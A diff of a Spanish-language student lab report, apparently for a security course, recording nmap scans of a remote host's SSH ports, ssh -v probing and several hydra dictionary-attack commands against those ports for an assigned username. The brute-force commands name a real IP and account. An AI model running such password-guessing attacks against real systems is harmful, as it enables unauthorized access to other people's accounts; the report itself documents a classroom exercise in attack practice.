@@ -120,7 +120,8 @@ PORT     STATE SERVICE VERSION
 			- pasaste12
 			- bandera12
 			- BANDERASI
-* Realizando otra ejecución de nmap obtuvimos:
+
+* Realizando otra ejecucion de nmap obtuvimos:
 ```bash
 ntory@debian11:~/CyS/p04$ nmap -sV -Pn -sT -p -25000 44.199.201.139
 Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-20 00:01 CST
@@ -154,15 +155,79 @@ SF:nericLines,3,"b\r\n");
 SF-Port22222-TCP:V=7.80%I=7%D=3/20%Time=64180239%P=x86_64-pc-linux-gnu%r(G
 SF:enericLines,B,"9\*oT9`U!t\r\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3084.25 seconds
+```
+
+* Realizando otra ejecución de nmap obtenemos:
+```bash
+ntory@debian11:~/CyS/p04$ nmap -sV -Pn -sT -p -25000 44.199.201.139
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-21 10:32 CST
+Nmap scan report for ec2-44-199-201-139.compute-1.amazonaws.com (44.199.201.139)
+Host is up (0.084s latency).
+Not shown: 24993 filtered ports
+PORT      STATE SERVICE     VERSION
+222/tcp   open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+2200/tcp  open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+2202/tcp  open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+2220/tcp  open  netiq?
+2222/tcp  open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+22022/tcp open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+22222/tcp open  easyengine?
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port2220-TCP:V=7.80%I=7%D=3/21%Time=6419EBC5%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,17,"nH\^K5P0>!6MJU>v_fKr26\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22222-TCP:V=7.80%I=7%D=3/21%Time=6419EBC5%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,1B,"22b=I}c\?\+\|7>Qj,l\(t\(B8OMhR\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 4146.65 seconds
+```
+
+* Realizando otras varias ejecuciones de nmap obtuvimos(junte los puertos de varias ejecuciones):
+
+```bash
+ntory@debian11:~/CyS/p04$ nmap -sV -Pn -sT -p -25000 44.199.201.139
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-20 00:01 CST
+Stats: 0:27:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 57.51% done; ETC: 00:49 (0:20:14 remaining)
+Service scan Timing: About 66.67% done; ETC: 00:53 (0:00:54 remaining)
+Nmap scan report for ec2-44-199-201-139.compute-1.amazonaws.com (44.199.201.139)
+Host is up (0.087s latency).
+Not shown: 24992 filtered ports
+PORT      STATE SERVICE     VERSION
+53/tcp 		open  domain
+222/tcp  	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+2200/tcp 	open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+2202/tcp 	open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+2220/tcp  	open  netiq?
+2222/tcp  	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+22022/tcp 	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+22220/tcp 	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+22222/tcp 	open  easyengine?
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port2220-TCP:V=7.80%I=7%D=3/20%Time=64180239%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,3,"b\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22222-TCP:V=7.80%I=7%D=3/20%Time=64180239%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,B,"9\*oT9`U!t\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 3084.25 seconds
 
 ```
 
+> Este puerto a veces me salia con otra descripción: 2200/tcp  open  tcpwrapped
 
+* El bueno?
+	- 22220/tcp open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
 
-####  Uso del parámetro _-v_.
+####  Uso del parámetro _-v_ para saber la diferencia entre los puertos.
 
 * Ejecutando ssh con el párametro *_-v_* sobre uno de los puertos que nos permitían intentar realizar una conección rapido obtuvimos la siguiente información tras poder ingresar nuestra clave:
 
@@ -230,10 +295,28 @@ debug1: Next authentication method: password
 315073120@44.199.201.139's password: 
 ```
 
-* Ejecutando ssh con el párametro *_-v_* sobre el puerto(2220) que NO nos permitían intentar realizar una conección rapido obtuvimos la siguiente información tras poder ingresar nuestra clave:
-	- La salida se encuentra en el archivo [result.txt](\files\result.txt) porque fue muy grande. Y no pude interpretar la salida del debug1. :sad: 
+* Recordemos que tenemos los puertos activos que permiten peticiones porque el 22222 y el 2220 se mueren en el proceso:
+	- 53/tcp 		open  domain
+	- 222/tcp  	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	- 2200/tcp 	open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	- 2202/tcp 	open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	- 2222/tcp  	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	- 22022/tcp 	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	- 22220/tcp 	open  ssh         OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
 
-* Por lo que ahora atacaremos los 4 puertos que permiten realizar una conección by ssh.
+* Utilizando ssh -v -p <puerto> 315073120@44.199.201.139  sobre el puerto 22022 necesitamos dar una confirmación de fingerprint. 
+	- 
+
+* Utilizando ssh -v -p 22220 315073120@44.199.201.139  obtenemos la misma información que el puerto 222, podemos notar que estos puertos no piden una confirmación de finger.
+	- 2200, 2202, 22022,2222
+
+
+* Ejecutando ssh con el párametro *_-v_* sobre uno de los puertos que nos permitían intentar realizar una conección rapido obtuvimos la siguiente información tras poder ingresar nuestra clave:
+
+* Ejecutando ssh con el párametro *_-v_* sobre los puertos 2220 y 22222 que NO nos permitían intentar realizar una conección rapido obtuvimos la siguiente información tras poder ingresar nuestra clave:
+	- La salida se encuentra en el archivo [result.txt](\files\result.txt) porque fue muy grande. Y no pude interpretar la salida del debug1. :sad: Solo descubrimos que estos puertos se tragan tu conección. 
+
+* Por lo que ahora atacaremos los 6 puertos que permiten realizar una conección by ssh.
 
 * Para realizar las listas de palabras con 9 caracteres filtre las wordlist encontradas en internet utilice este [colab](https://colab.research.google.com/drive/1hnuIa4-3IH76sHEHqztqiwj_ImMm-PUe?usp=sharing).
 
@@ -245,14 +328,22 @@ Obtener mediante un ataque de diccionario la contraseña correspondiente a su  u
 ```bash
 sudo dnf install hydra -y 
 ```
-#### Luego atacaremos el puerto 222 con el comando:
+#### Atacando varios puertos con los siguientes comandos no encontramos respuesta...
 
 ```bash
 hydra -s 222 -l 315073120 -P /home/ntory/CyS/p04/palabras9car.txt 44.199.201.139 -t 4 -f ssh
+hydra -s 2222 -l 315073120 -P /home/ntory/CyS/p04/palabras9car.txt
+hydra -s 2222 -l 315073120 -P /home/ntory/CyS/p04/mas_palabras.txt 44.199.201.139 -f ssh
+hydra -s 2202 -l 315073120 -P /home/ntory/CyS/p04/palabras9car.txt 44.199.201.139 -f ssh
+hydra -s 222 -l 315073120 -P /home/ntory/CyS/p04/palabras9car.txt 44.199.201.139 -t 4 -f ssh
+hydra -s 22220 -l 315073120 -P /home/ntory/CyS/p04/alpha-passwords.txt 44.199.201.139 -f ssh
+hydra -s 22220 -l 315073120 -P /home/ntory/CyS/p04/200k-passwords.txt 44.199.201.139 -f ssh
 ```
 
-O si configuras 44.199.201.139 como attackbox2
+alpha-passwords tiene 300k lineas :p 
 
+O si configuras 44.199.201.139 como attackbox2
+git
 hydra -l usuario -p contraseñaAUsar attackbox2 ssh
 44.199.201.139 
 
@@ -270,3 +361,7 @@ PLANTILLA
 ```
 ------
 📢⌨️ with ❤️ by [Jose-MPM](https://github.com/Jose-MPM) 😊⌨️ and [Kary-GOD](https://github.com/Kary-AG) 😊⌨️🎁
+
+
+
+ hydra -s 2222 -l 315073120 -P /home/ntory/CyS/p04/mas_palabras.txt 44.199.201.139 -f ssh
